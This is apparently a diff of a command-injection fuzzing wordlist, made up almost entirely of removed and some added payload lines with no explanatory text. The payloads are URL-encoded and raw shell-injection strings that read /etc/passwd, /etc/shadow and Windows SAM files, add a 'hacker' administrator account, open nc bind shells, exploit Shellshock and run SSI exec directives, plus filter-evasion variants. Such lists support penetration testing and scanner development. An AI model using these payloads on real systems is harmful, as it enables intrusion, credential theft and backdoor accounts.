-%252%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60
-%252%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20%23%27%20%7Cping%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20%23%5C%22%20%7Cping%20-n%2021%20127.0.0.1
-%2520%24%28sleep%252050%29
-%2520%27sleep%252050%27
-%2522%250a%2Fusr%2Fbin%2Fid%250a%2522
-%257fid
-%26%20dir
-%26%20dir%20c%3A%5C
-%26%20dir%20c%3A%5Cdocuments%20and%20settings%5C%2A
-%26%20dir%20c%3A%5Cusers
-%26%20id
-%26%20ifconfig
-%26%20ipconfig%20%2Fall
-%26%20ls%20-l%20%2F
-%26%20ls%20-l%20%2Fetc%2F
-%26%20ls%20-lar%20%2Fetc
-%26%20ls%20-lar%20%2Fvar%2Fwww
-%26%20nc%20-lvvp%204444%20-e%20%2Fbin%2Fsh%26
-%26%20net%20localgroup%20administrators%20hacker%20%2Fadd
-%26%20net%20user%20hacker%20password1%20%2Fadd
-%26%20net%20view
-%26%20netstat%20-an
-%26%20perl%20-e%20%27print%20%22x%22x16096%27
-%26%20phpinfo%28%29
-%26%20ping%20-i%2030%20127.0.0.1%20%26
-%26%20pwd
-%26%20sleep%205
-%26%20system%28%27sleep%205%27%29%3B
-%26%20systeminfo
-%26%20type%20%25systemroot%25%5Crepair%5Csam
-%26%20type%20%25systemroot%25%5Crepair%5Csystem
-%26%20type%20c%3A%5Cwindows%5Crepair%5Csam
-%26%20type%20c%3A%5Cwindows%5Crepair%5Csystem
-%26%20type%20c%3A%5Cwinnt%5Crepair%5Csam
-%26%20uname%20-a
-%26%20whoami
-%26%26%20dir
-%26%26%20dir%20c%3A%5C
-%26%26%20dir%20c%3A%5Cdocuments%20and%20settings%5C%2A
-%26%26%20dir%20c%3A%5Cusers
-%26%26%20ifconfig
-%26%26%20ipconfig%20%2Fall
-%26%26%20ls%20-l%20%2F
-%26%26%20ls%20-l%20%2Fetc%2F
-%26%26%20ls%20-lar%20%2Fetc
-%26%26%20ls%20-lar%20%2Fvar%2Fwww
-%26%26%20nc%20-lvvp%204444%20-e%20%2Fbin%2Fsh%20%26
-%26%26%20net%20localgroup%20administrators%20hacker%20%2Fadd
-%26%26%20net%20user%20hacker%20password1%20%2Fadd
-%26%26%20net%20view
-%26%26%20netstat%20-an
-%26%26%20perl%20-e%20%27print%20%22x%22x16096%27
-%26%26%20phpinfo%28%29
+%250dcat%20%2Fetc%2Fpasswd%250d
+%250dcd
+%250dcd%250d
+%250dping%20-c%205%20127.0.0.1
+%250dping%20-n%205%20127.0.0.1
+%250dping%20-n%205%20127.0.0.1%250d
+%250dpwd
+%250dpwd%250d
+%250dwhoami
+%250dwhoami%250d
+%26%26%20%24PATH
+%26%26%20%2Fusr%2Fbin%2Fid
+%26%26%20cat%20%2Fetc%2Fpasswd
+%26%26%20cd
+%26%26%20ping%20-c%205%20127.0.0.1
+%26%26%20ping%20-n%205%20127.0.0.1
 %26%26%20pwd
-%26%26%20sleep%205
-%26%26%20sysinfo
-%26%26%20system%28%27sleep%205%27%29%3B
 %26%26%20systeminfo
-%26%26%20type%20%25systemroot%25%5Crepair%5Csam
-%26%26%20type%20%25systemroot%25%5Crepair%5Csystem
-%26%26%20type%20c%3A%5Cwindows%5Crepair%5Csam
-%26%26%20type%20c%3A%5Cwindows%5Crepair%5Csystem
-%26%26%20type%20c%3A%5Cwinnt%5Crepair%5Csam
-%26%26%20uname%20-a
 %26%26%20whoami
-%26%26dir
-%26%26id
-%26%26type%20c%3A%5C%5Cboot.ini
-%26id
-%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B
-%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fshadow%26quot%3B--%26gt%3B
-%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fusr%2Fbin%2Fid%3B--%26gt%3B
-%27%20%26%20whoami
-%27%20%26%26%20whoami
-%27%20%7C%7C%20whoami
-%27%20whoami
-%27%26%20ping%20-i%2030%20127.0.0.1%20%26%27
-%27%3B%20whoami
-%27%3Bid%3B%27
-%27%3Bphpinfo%28%29%3B%2F%2F
-%27%5Cn%2Fbin%2Fls%20-al%5Cn%27
-%27%7C%2Fusr%2Fbin%2Fid%7C%27
-%27%7C%7C%2Fusr%2Fbin%2Fid%7C%27
-%27%7Cid%7C%27
-%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fbash%20-c%20%22%5C%60grep%20root%20%2Fetc%2Fshadow%5C%60%22
-%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fbash%20-c%20%22%5C%60nc%20-lvvp%202035%20-e%20%2Fbin%2Fbash%5C%60%22
-%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fbash%20-c%20%22%5C%60pwd%5C%60%22
-%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fbash%20-c%20%22%5C%60uname%20-a%5C%60%22
-%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fbash%20-c%20%22%5C%60whoami%5C%60%22
-%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fbash%20-c%20%22pwd%22
-%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fbash%20-c%20%22sleep%205%20%26%26%20echo%20vulnerable%201%22
-%28%29%20%7B%20%3A%3B%7D%3B%20echo%20vulnerable%2010
-%28%29%20%7B%20%3A%3B%7D%3B%2Fusr%2Fbin%2Fperl%20-e%20%27print%20%5C%22content-type%3A%20text%2Fplain%5C%5Cr%5C%5Cn%5C%5Cr%5C%5Cnxsuccess%21%5C%22%3Bsystem%28%5C%22pwd%5C%22%29%3B%27
-%2A%3B%20ls%20-lhtr%20%2Fvar%2Fwww%2F
-%2F%2A%24%28sleep%205%29%60sleep%205%60%60%2A%2F-sleep%285%29-%27%2F%2A%24%28sleep%205%29%60sleep%205%60
-%2F%5Cb%5Ci%5Cn%2F%2F%2F%2F%2Fs%5Ch
-%2F..%2F..%2F%22%29%3Bprint_r%28glob%28%27%2A%27%29%29%3B%28%22
-%2Findex.html%7Cid%7C
-%3B%20dir
-%3B%20dir%20c%3A%5C
-%3B%20dir%20c%3A%5Cdocuments%20and%20settings%5C%2A
-%3B%20dir%20c%3A%5Cusers
-%3B%20id
-%3B%20ifconfig
-%3B%20ipconfig%20%2Fall
-%3B%20ls%20-l%20%2F
-%3B%20ls%20-l%20%2Fetc%2F
-%3B%20ls%20-l%20%2Fhome%2F%2A
-%3B%20ls%20-l%20%2Fvar%2Fwww%2F%2A
-%3B%20ls%20-lar%20%2Fetc
-%3B%20nc%20-lvvp%204444%20-e%20%2Fbin%2Fsh%3B
-%3B%20net%20localgroup%20administrators%20hacker%20%2Fadd
-%3B%20net%20user%20hacker%20password1%20%2Fadd
-%3B%20net%20view
-%3B%20netstat%20-an
-%3B%20perl%20-e%20%27print%20%22x%22x16096%27
-%3B%20ping%20127.0.0.1%20%3B
+%26%26%24PATH
+%26%26%2Fusr%2Fbin%2Fid
+%26%26cat%20%2Fetc%2Fpasswd
+%26%26cd
+%26%26ping%20-c%205%20127.0.0.1
+%26%26ping%20-n%205%20127.0.0.1
+%26%26pwd
+%26%26systeminfo
+%26%26whoami
+%3B%20%24PATH
+%3B%20%2Fusr%2Fbin%2Fid
+%3B%20cat%20%2Fetc%2Fpasswd
+%3B%20ping%20-c%205%20127.0.0.1
 %3B%20pwd
-%3B%20sleep%205
-%3B%20system%28%27sleep%205%27%29%3B
-%3B%20systeminfo
-%3B%20type%20%25systemroot%25%5Crepair%5Csam
-%3B%20type%20%25systemroot%25%5Crepair%5Csystem
-%3B%20type%20c%3A%5Cwindows%5Crepair%5Csam
-%3B%20type%20c%3A%5Cwindows%5Crepair%5Csystem
-%3B%20type%20c%3A%5Cwinnt%5Crepair%5Csam
-%3B%20uname%20-a
 %3B%20whoami
-%3B%2Fusr%2Fbin%2Fid%5Cn
-%3B%2Fusr%2Fbin%2Fid%7C
-%3B%7C%2Fusr%2Fbin%2Fid%7C
-%3Becho%20111111
-%3Bid
-%3Bid%3B
-%3Bid%5Cn
-%3Bid%7C
-%3Bls%20-la
-%3Bnetstat%20-a%3B
-%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29
-%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29
-%3Bsystem%28%27id%27%29
-%3Buname%20-a%3B
-%3C%21--%23config%20errmsg%3D%22file%20not%20found%2C%20informs%20users%20and%20password%22--%3E
-%3C%21--%23config%20timefmt%3D%22a%20%25b%20%25d%20%25y%20%25r%22--%3E
-%3C%21--%23echo%20var%3D%22auth_type%22%20--%3E
-%3C%21--%23echo%20var%3D%22content_length%22%20--%3E
-%3C%21--%23echo%20var%3D%22content_type%22%20--%3E
-%3C%21--%23echo%20var%3D%22date_gmt%22%20--%3E
-%3C%21--%23echo%20var%3D%22date_local%22%20--%3E
-%3C%21--%23echo%20var%3D%22document_name%22%20--%3E
-%3C%21--%23echo%20var%3D%22document_root%22%20--%3E
-%3C%21--%23echo%20var%3D%22document_uri%22%20--%3E
-%3C%21--%23echo%20var%3D%22forwarded%22%20--%3E
-%3C%21--%23echo%20var%3D%22from%22%20--%3E
-%3C%21--%23echo%20var%3D%22gateway_interface%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_accept%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_accept_charset%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_accept_encoding%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_accept_language%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_client_ip%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_connection%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_cookie%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_form%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_host%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_referer%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_ua_cpu%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_ua_os%22%20--%3E
-%3C%21--%23echo%20var%3D%22http_user_agent%22%20--%3E
-%3C%21--%23echo%20var%3D%22last_modified%22%20--%3E
-%3C%21--%23echo%20var%3D%22netsite_root%22%20--%3E
-%3C%21--%23echo%20var%3D%22page_count%22%20--%3E
-%3C%21--%23echo%20var%3D%22path%22%20--%3E
-%3C%21--%23echo%20var%3D%22path_info%22%20--%3E
-%3C%21--%23echo%20var%3D%22path_info_translated%22%20--%3E
-%3C%21--%23echo%20var%3D%22path_translated%22%20--%3E
-%3C%21--%23echo%20var%3D%22query_string%22%20--%3E
-%3C%21--%23echo%20var%3D%22query_string_unescaped%22%20--%3E
-%3C%21--%23echo%20var%3D%22remote_addr%22%20--%3E
-%3C%21--%23echo%20var%3D%22remote_host%22%20--%3E
-%3C%21--%23echo%20var%3D%22remote_ident%22%20--%3E
-%3C%21--%23echo%20var%3D%22remote_port%22%20--%3E
-%3C%21--%23echo%20var%3D%22remote_user%22%20--%3E
-%3C%21--%23echo%20var%3D%22request_method%22%20--%3E%09
-%3C%21--%23echo%20var%3D%22request_uri%22%20--%3E
-%3C%21--%23echo%20var%3D%22script_filename%22%20--%3E
-%3C%21--%23echo%20var%3D%22script_name%22%20--%3E
-%3C%21--%23echo%20var%3D%22script_uri%22%20--%3E
-%3C%21--%23echo%20var%3D%22script_url%22%20--%3E
-%3C%21--%23echo%20var%3D%22server_addr%22%20--%3E
-%3C%21--%23echo%20var%3D%22server_admin%22%20--%3E
-%3C%21--%23echo%20var%3D%22server_name%20--%3E
-%3C%21--%23echo%20var%3D%22server_port%22%20--%3E
-%3C%21--%23echo%20var%3D%22server_protocol%22%20--%3E
-%3C%21--%23echo%20var%3D%22server_software%22%20--%3E
-%3C%21--%23echo%20var%3D%22site_htmlroot%22%20--%3E
-%3C%21--%23echo%20var%3D%22total_hits%22%20--%3E
-%3C%21--%23echo%20var%3D%22tz%22%20--%3E
-%3C%21--%23echo%20var%3D%22unique_id%22%20--%3E
-%3C%21--%23echo%20var%3D%22user_name%22%20--%3E
-%3C%21--%23exec%20cmd%3D%22%2Fbin%2Fcat%20%2Fetc%2Fpasswd%22--%3E
-%3C%21--%23exec%20cmd%3D%22%2Fbin%2Fcat%20%2Fetc%2Fshadow%22--%3E
-%3C%21--%23exec%20cmd%3D%22%2Fbin%2Fls%20%2F%22%20--%3E
-%3C%21--%23exec%20cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E
-%3C%21--%23exec%20cmd%3D%22cd%20c%3A%5Cwindows%5Csystem32%22%3E
-%3C%21--%23exec%20cmd%3D%22dir%22%20--%3E
-%3C%21--%23exec%20cmd%3D%22ls%22%20--%3E
-%3C%21--%23exec%20cmd%3D%22wget%20http%3A%2F%2Flocalhost%2F%22%20--%3E
-%3C%21--%23exec%20cmd%3D%22whoami%22--%3E
-%3C%21--%23flastmod%20virtual%3D%22echo.html%22%20--%3E
-%3C%21--%23fsize%20file%3D%22ssi.shtml%22%20--%3E
-%3C%21--%23include%20file%3D%3Fuuuuuuuu...uu%3F--%3E
-%3C%21--%23printenv%20--%3E
-%3Cpre%3E%3C%21--%23echo%20var%3D%22date_local%22%20--%3E%20%3C%2Fpre%3E
-%3Cpre%3E%3C%21--%23exec%20cmd%3D%22dir%22%20--%3E%3C%2Fpre%3E
-%3Cpre%3E%3C%21--%23exec%20cmd%3D%22ls%22%20--%3E%3C%2Fpre%3E
-%3Cpre%3E%3C%21--%23exec%20cmd%3D%22whoami%22--%3E%3C%2Fpre%3E
-%5Cn%2Fbin%2Fls%20-al%5Cn
-%5Cn%2Fusr%2Fbin%2Fid%3B
-%5Cn%2Fusr%2Fbin%2Fid%5Cn
-%5Cn%2Fusr%2Fbin%2Fid%7C
-%5Cn%5C033%5B2curl%20%5C%60whoami%5C%60
-%5Cn%5C033%5B2wget%20%5C%60whoami%5C%60
-%5Cnecho%20injectx%5Cnexit%5Cn%5C033%5B2asleep%205%5Cn
-%5Cnid%3B
-%5Cnid%5Cn
-%5Cnid%7C
-%5Cnnetstat%20-a%25%5Cn
-%5Cr
-%5Cr%5Cn
-%5Cu%5Cn%5Ca%5Cm%5Ce%20%5C-%5Ca
-%60%2Fusr%2Fbin%2Fid%60
-%60dir%60
-%60echo%20%24%27cat%5Cx20%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%27%60
-%60echo%20-e%20%22%5Cx63%5Cx61%5Cx74%5Cx20%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22%60
-%60id%60
-%60ls%60
-%60perl%20-e%20%27print%20%22.%25p%22%20x%2080%27%60%25n
-%60ping%20127.0.0.1%60
+%3B%24PATH
+%3B%2Fusr%2Fbin%2Fid
+%3Bcat%20%2Fetc%2Fpasswd
+%3Bping%20-c%205%20127.0.0.1
+%3Bpwd
+%3Bwhoami
 %7Bcat%2C%2Fetc%2Fpasswd%7D
 %7Becho%2Ctest%7D
-%7C%20dir
-%7C%20dir%20c%3A%5C
-%7C%20dir%20c%3A%5Cdocuments%20and%20settings%5C%2A
-%7C%20dir%20c%3A%5Cusers
-%7C%20id
-%7C%20ifconfig
-%7C%20ipconfig%20%2Fall
-%7C%20ls%20-l%20%2F
-%7C%20ls%20-l%20%2Fetc%2F
-%7C%20ls%20-lar%20%2Fetc
-%7C%20ls%20-lar%20%2Fvar%2Fwww
-%7C%20nc%20-lvvp%204444%20-e%20%2Fbin%2Fsh%7C
-%7C%20net%20localgroup%20administrators%20hacker%20%2Fadd
-%7C%20net%20user%20hacker%20password1%20%2Fadd
-%7C%20net%20view
-%7C%20netstat%20-an
-%7C%20perl%20-e%20%27print%20%22x%22x16096%27
-%7C%20phpinfo%28%29
-%7C%20pwd
-%7C%20sleep%205
-%7C%20system%28%27sleep%205%27%29%3B
-%7C%20systeminfo
-%7C%20type%20%25systemroot%25%5Crepair%5Csam
-%7C%20type%20%25systemroot%25%5Crepair%5Csystem
-%7C%20type%20c%3A%5Cwindows%5Crepair%5Csam
-%7C%20type%20c%3A%5Cwindows%5Crepair%5Csystem
-%7C%20type%20c%3A%5Cwinnt%5Crepair%5Csam
-%7C%20uname%20-a
-%7C%20whoami
-%7C%2Fbin%2Fls%20-al
-%7C%2Fusr%2Fbin%2Fid
-%7C%2Fusr%2Fbin%2Fid%7C
-%7C%5Cnid%5Cn
-%7C%7C%20perl%20-e%20%27print%20%22x%22x16096%27
-%7C%7C%20phpinfo%28%29
-%7C%7C%20ping%20-i%2030%20127.0.0.1%20%3B%20x%20%7C%7C%20ping%20-n%2030%20127.0.0.1%20%26
-%7C%7C%20sleep%2010
-%7C%7C%20system%28%27sleep%205%27%29%3B
-%7C%7C%2Fusr%2Fbin%2Fid%3B
-%7C%7C%2Fusr%2Fbin%2Fid%7C
-%7C%7Cid
-%7Cid
-%7Cid%3B
-%7Cid%7C
-%7Cls
-%7Cls%20-la
-%7Cusr%2Fbin%2Fid%5Cn
-%7fid
-&&dir
-&&dirc:\
-&&dirc:\documentsandsettings\*
-&&dirc:\users
-&&id
-&&ifconfig
-&&ipconfig/all
-&&ls-l/
-&&ls-l/etc/
-&&ls-lar/etc
-&&ls-lar/var/www
-&&nc-lvvp4444-e/bin/sh&
-&&netlocalgroupadministratorshacker/add
-&&netstat-an
-&&netuserhackerpassword1/add
-&&netview
-&&perl-e'print"x"x16096'
-&&phpinfo()
-&&pwd
-&&sleep5
-&&sysinfo
-&&system('sleep5');
-&&systeminfo
-&&type%systemroot%\repair\sam
-&&type%systemroot%\repair\system
-&&typec:\\boot.ini
-&&typec:\windows\repair\sam
-&&typec:\windows\repair\system
-&&typec:\winnt\repair\sam
-&&uname-a
-&&whoami
-&dir
-&dirc:\
-&dirc:\documentsandsettings\*
-&dirc:\users
-&id
-&ifconfig
-&ipconfig/all
-&ls-l/
-&ls-l/etc/
-&ls-lar/etc
-&ls-lar/var/www
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-&nc-lvvp4444-e/bin/sh&
-&netlocalgroupadministratorshacker/add
-&netstat-an
-&netuserhackerpassword1/add
-&netview
-&perl-e'print"x"x16096'
-&phpinfo()
-&ping-i30127.0.0.1&
-&pwd
-&sleep5
-&system('sleep5');
-&systeminfo
-&type%systemroot%\repair\sam
-&type%systemroot%\repair\system
-&typec:\windows\repair\sam
-&typec:\windows\repair\system
-&typec:\winnt\repair\sam
-&uname-a
-&whoami
-'&&whoami
-'&ping-i30127.0.0.1&'
-'&whoami
-';id;'
-';phpinfo();//
-';whoami
-'ORsystem("cat/etc/passwd")
-'\n/bin/ls-al\n'
-'whoami
-'|/usr/bin/id|'
-'|id|'
-'||/usr/bin/id|'
-'||whoami
-(){:;};/bin/bash-c"\`greproot/etc/shadow\`"
-(){:;};/bin/bash-c"\`nc-lvvp2035-e/bin/bash\`"
-(){:;};/bin/bash-c"\`pwd\`"
-(){:;};/bin/bash-c"\`uname-a\`"
-(){:;};/bin/bash-c"\`whoami\`"
-(){:;};/bin/bash-c"pwd"
-(){:;};/bin/bash-c"sleep5&&echovulnerable1"
-(){:;};/usr/bin/perl-e'print\"content-type:text/plain\\r\\n\\r\\nxsuccess!\";system(\"pwd\");'
-(){:;};echovulnerable10
-*;ls-lhtr/var/www/
-/*$(sleep5)`sleep5``*/-sleep(5)-'/*$(sleep5)`sleep5`
-/../../");print_r(glob('*'));("
-/\b\i\n/////s\h
-/index.html|id|
-0-ohacker
-1%3Bsleep%24%7Bifs%7D9
-1%3Bsleep%24%7Bifs%7D9%3B
-127.0.0.1%0als
-127.0.0.1%20%250a%20ls
-127.0.0.1%26%26id
-127.0.0.1%26id
-127.0.0.1%3Bid
-127.0.0.1%7Cid
-127.0.0.1&&id
-127.0.0.1&id
-127.0.0.1;id
-127.0.0.1|id
-1;sleep${ifs}9
-1;sleep${ifs}9;
-;/usr/bin/id\n
-;/usr/bin/id|
-;dir
-;dirc:\
-;dirc:\documentsandsettings\*
-;dirc:\users
-;echo111111
-;id
-;id;
-;id\n
-;id|
-;ifconfig
-;ipconfig/all
-;ls-l/
-;ls-l/etc/
-;ls-l/home/*
-;ls-l/var/www/*
-;ls-la
-;ls-lar/etc
-;nc-lvvp4444-e/bin/sh;
-;netlocalgroupadministratorshacker/add
-;netstat-a;
-;netstat-an
-;netuserhackerpassword1/add
-;netview
-;perl-e'print"x"x16096'
-;ping127.0.0.1;
-;pwd
-;sleep5
-;system('/usr/bin/id')
-;system('cat%20/etc/passwd')
-;system('id')
-;system('sleep5');
-;systeminfo
-;type%systemroot%\repair\sam
-;type%systemroot%\repair\system
-;typec:\windows\repair\sam
-;typec:\windows\repair\system
-;typec:\winnt\repair\sam
-;uname-a
-;uname-a;
-;whoami
-;|/usr/bin/id|
-<!--#configerrmsg="filenotfound,informsusersandpassword"-->
-<!--#configtimefmt="a%b%d%y%r"-->
-<!--#echovar="auth_type"-->
-<!--#echovar="content_length"-->
-<!--#echovar="content_type"-->
-<!--#echovar="date_gmt"-->
-<!--#echovar="date_local"-->
-<!--#echovar="document_name"-->
-<!--#echovar="document_root"-->
-<!--#echovar="document_uri"-->
-<!--#echovar="forwarded"-->
-<!--#echovar="from"-->
-<!--#echovar="gateway_interface"-->
-<!--#echovar="http_accept"-->
-<!--#echovar="http_accept_charset"-->
-<!--#echovar="http_accept_encoding"-->
-<!--#echovar="http_accept_language"-->
-<!--#echovar="http_client_ip"-->
-<!--#echovar="http_connection"-->
-<!--#echovar="http_cookie"-->
-<!--#echovar="http_form"-->
-<!--#echovar="http_host"-->
-<!--#echovar="http_referer"-->
-<!--#echovar="http_ua_cpu"-->
-<!--#echovar="http_ua_os"-->
-<!--#echovar="http_user_agent"-->
-<!--#echovar="last_modified"-->
-<!--#echovar="netsite_root"-->
-<!--#echovar="page_count"-->
-<!--#echovar="path"-->
-<!--#echovar="path_info"-->
-<!--#echovar="path_info_translated"-->
-<!--#echovar="path_translated"-->
-<!--#echovar="query_string"-->
-<!--#echovar="query_string_unescaped"-->
-<!--#echovar="remote_addr"-->
-<!--#echovar="remote_host"-->
-<!--#echovar="remote_ident"-->
-<!--#echovar="remote_port"-->
-<!--#echovar="remote_user"-->
-<!--#echovar="request_method"-->
-<!--#echovar="request_uri"-->
-<!--#echovar="script_filename"-->
-<!--#echovar="script_name"-->
-<!--#echovar="script_uri"-->
-<!--#echovar="script_url"-->
-<!--#echovar="server_addr"-->
-<!--#echovar="server_admin"-->
-<!--#echovar="server_name-->
-<!--#echovar="server_port"-->
-<!--#echovar="server_protocol"-->
-<!--#echovar="server_software"-->
-<!--#echovar="site_htmlroot"-->
-<!--#echovar="total_hits"-->
-<!--#echovar="tz"-->
-<!--#echovar="unique_id"-->
-<!--#echovar="user_name"-->
-<!--#execcmd="/bin/cat/etc/passwd"-->
-<!--#execcmd="/bin/cat/etc/shadow"-->
-<!--#execcmd="/bin/ls/"-->
-<!--#execcmd="/usr/bin/id;-->
-<!--#execcmd="cdc:\windows\system32">
-<!--#execcmd="dir"-->
-<!--#execcmd="ls"-->
-<!--#execcmd="wgethttp://localhost/"-->
-<!--#execcmd="whoami"-->
-<!--#flastmodvirtual="echo.html"-->
-<!--#fsizefile="ssi.shtml"-->
-<!--#includefile=?uuuuuuuu...uu?-->
-<!--#printenv-->
-<pre><!--#echovar="date_local"--></pre>
-<pre><!--#execcmd="dir"--></pre>
-<pre><!--#execcmd="ls"--></pre>
-<pre><!--#execcmd="whoami"--></pre>
-\n/bin/ls-al\n
-\n/usr/bin/id;
-\n/usr/bin/id\n
-\n/usr/bin/id|
-\n\033[2curl\`whoami\`
-\n\033[2wget\`whoami\`
-\nechoinjectx\nexit\n\033[2asleep5\n
-\nid;
-\nid\n
-\nid|
-\nnetstat-a%\n
-\r
-\r\n
-\u\n\a\m\e\-\a
-`/usr/bin/id`
-`dir`
-`echo$'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
-`echo-e"\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-`id`
-`ls`
-`perl-e'print".%p"x80'`%n
-`ping127.0.0.1`
-a%29%3B%2Fusr%2Fbin%2Fid
-a%29%3B%2Fusr%2Fbin%2Fid%3B
-a%29%3B%2Fusr%2Fbin%2Fid%7C
-a%29%3Bid
-a%29%3Bid%3B
-a%29%3Bid%7C
-a%29%7C%2Fusr%2Fbin%2Fid
-a%29%7C%2Fusr%2Fbin%2Fid%3B
-a%29%7Cid
-a%29%7Cid%3B
-a%3B%2Fusr%2Fbin%2Fid
-a%3B%2Fusr%2Fbin%2Fid%3B
-a%3B%2Fusr%2Fbin%2Fid%7C
-a%3Bid
-a%3Bid%3B
-a%3Bid%5Cn
-a%3Bid%7C
-a%7C%2Fusr%2Fbin%2Fid
-a%7Cid
-a%7Cid%7C
-a);/usr/bin/id
-a);/usr/bin/id;
-a);/usr/bin/id|
-a);id
-a);id;
-a);id|
-a)|/usr/bin/id
-a)|/usr/bin/id;
-a)|id
-a)|id;
-a;/usr/bin/id
-a;/usr/bin/id;
-a;/usr/bin/id|
-a;id
-a;id;
-a;id\n
-a;id|
-abc%3D%24%27%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%27%3Bcat%20abc
-abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';catabc
-a|/usr/bin/id
-a|id
-a|id|
-bash%3C%3C%3C%24%28base64%20-d%3C%3C%3Cd2hvyw1p%29
-bash%3C%3C%3C%24%28base64%20-d%3C%3C%3Cy2f0ic9ldgmvcgfzc3dkihwgz3jlccazmw%3D%3D%29
-bash<<<$(base64-d<<<d2hvyw1p)
-bash<<<$(base64-d<<<y2f0ic9ldgmvcgfzc3dkihwgz3jlccazmw==)
-cat$(echo.|tr'!-0''"-1')etc$(echo.|tr'!-0''"-1')passwd
-cat$ifs/etc/passwd
-cat$u/etc$u/passwd$u
-cat${home:0:1}etc${home:0:1}passwd
-cat${ifs}/etc/passwd
-cat%20%24%28echo%20.%20%7C%20tr%20%27%21-0%27%20%27%22-1%27%29etc%24%28echo%20.%20%7C%20tr%20%27%21-0%27%20%27%22-1%27%29passwd
-cat%20%24%7Bhome%3A0%3A1%7Detc%24%7Bhome%3A0%3A1%7Dpasswd
-cat%20%2Fetc%2Fhosts
-cat%20%2Fetc%2Fpasswd
-cat%20%60echo%20-e%20%22%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22%60
-cat%20%60xxd%20-r%20-p%20%3C%3C%3C%202f6574632f706173737764%60
-cat%20%60xxd%20-r%20-ps%20%3C%28echo%202f6574632f706173737764%29%60
-cat%24%7Bifs%7D%2Fetc%2Fpasswd
-cat%24ifs%2Fetc%2Fpasswd
-cat%24u%20%2Fetc%24u%2Fpasswd%24u
-cat/etc/hosts
-cat/etc/passwd
-cat`echo-e"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-cat`xxd-r-p<<<2f6574632f706173737764`
-cat`xxd-r-ps<(echo2f6574632f706173737764)`
-dir
-dir%20c%3A%5C
-dir%20c%3A%5Cdocuments%20and%20settings%5C%2A
-dir%20c%3A%5Cusers
-dirc:\
-dirc:\documentsandsettings\*
-dirc:\users
-ech""otest
-ech%22%22o%20test
-ech%27%27o%20test
-ech''otest
-echo"ls\x09-l"|bash
-echo$((14+22))
-echo${ifs}test
-echo${ls_colors:10:1}
-echo${path:0:1}
-echo%20%22ls%5Cx09-l%22%20%7C%20bash
-echo%20%24%28%2814%2B22%29%29
-echo%20%24%7Bls_colors%3A10%3A1%7D
-echo%20%24%7Bpath%3A0%3A1%7D
-echo%20-e%20%22%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22
-echo%20whoami%7C%240
-echo%24%7Bifs%7Dtest
-echo-e"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
-echowhoami|$0
-eval%20eval%20py%7Bo..u%7Dhon%5C%5C%20-m%5C%5C%20simplehttpse%7Bq..v%7Dve%7Bq..v%7D%5C%5C%3B
-eval%28%27ls%27%29
-eval%28%27pwd%27%29
-eval%28%27pwd%27%29%3B
-eval%28%27sleep%205%27%29
-eval%28%27sleep%205%27%29%3B
-eval%28%27whoami%27%29
-eval%28%27whoami%27%29%3B
-eval('ls')
-eval('pwd')
-eval('pwd');
-eval('sleep5')
-eval('sleep5');
-eval('whoami')
-eval('whoami');
-evalevalpy{o..u}hon\\-m\\simplehttpse{q..v}ve{q..v}\\;
-exec%28%27ls%27%29
-exec%28%27pwd%27%29
-exec%28%27pwd%27%29%3B
-exec%28%27sleep%205%27%29
-exec%28%27sleep%205%27%29%3B
-exec%28%27whoami%27%29
-exec%28%27whoami%27%29%3B
-exec('ls')
-exec('pwd')
-exec('pwd');
-exec('sleep5')
-exec('sleep5');
-exec('whoami')
-exec('whoami');
-id""&whoami"&&whoami"whoami"|whoami"||whoami"
-id%00
-id%00|
